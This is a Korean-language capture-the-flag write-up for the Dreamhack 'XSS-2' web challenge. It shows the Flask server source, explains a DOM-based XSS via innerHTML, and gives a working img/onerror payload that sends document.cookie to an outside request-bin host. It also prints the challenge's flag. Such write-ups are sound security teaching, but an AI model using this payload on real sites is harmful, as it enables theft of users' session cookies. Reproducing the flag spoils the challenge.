## XSS - 2
<hr style="border-top: 1px solid;"><br>

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    return render_template("vuln.html")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)

```


<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

flag 페이지에서 보내는 요청을 플래그 쿠키를 가지고 있는 사용자가 읽게 된다.

xss-1 문제와 다르게 이번엔 vuln 페이지가 render_template로 리턴이 되어서 스크립트가 동작하지 않는다.

하지만 vuln 페이지 소스코드를 보면 이런 코드가 있다.

<br>

```html
<div id='vuln'></div>
<script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
```

<br>

innerHTML
: <a href="https://developer.mozilla.org/ko/docs/Web/API/Element/innerHTML" target="_blank">developer.mozilla.org/ko/docs/Web/API/Element/innerHTML</a>

<br>

정리하면 vuln 요소 즉, ```<div id='vuln'>{here}</div>```에서 here 부분의 내용을 수정할 수 있게 해주는 javascript 코드다.

테스트로 ```<h1>TEST</h1>```을 입력해보면 아래와 같이 출력된다.

<br>

![image](https://user-images.githubusercontent.com/52172169/156905431-19765d01-a33b-4e17-8c83-8ae39adde9da.png)

<br>

이 부분을 이용해서 풀 수 있다.

html 태그 안에 이벤트를 넣을 수가 있는데 이벤트 중 onload, onerror 등이 있다. 그 중 onerror를 이용하였다.

<br>

onerror
: <a href="https://www.w3schools.com/jsref/event_onerror.asp" target="_blank">w3schools.com/jsref/event_onerror.asp</a>

<br>

위 사이트를 들어가보면 예시에도 적혀있지만 img 태그를 이용하였다. supported html tag에 사용 가능한 태그가 있다.

따라서 이미지를 로드할 때 에러가 발생하면 자바스크립트를 실행하므로 이를 이용해서 에러를 일으켜 request bin의 서버로 보내면 쿠키 값을 확인할 수 있다. 

<br>

드림핵 툴을 이용해서 풀 수 있다.

Exploit
: ```<img src="" onerror=location.href="https://zbpnwsn.request.dreamhack.games?cookie="+document.cookie>```

<br>

![image](https://user-images.githubusercontent.com/52172169/156905140-c7b715af-188e-4c4c-9b6f-70a9d4134dda.png)

<br>

+ Flag : ```DH{3c01577e9542ec24d68ba0ffb846508f}```

<br><br>
<hr style="border: 2px solid;">
<br><br>
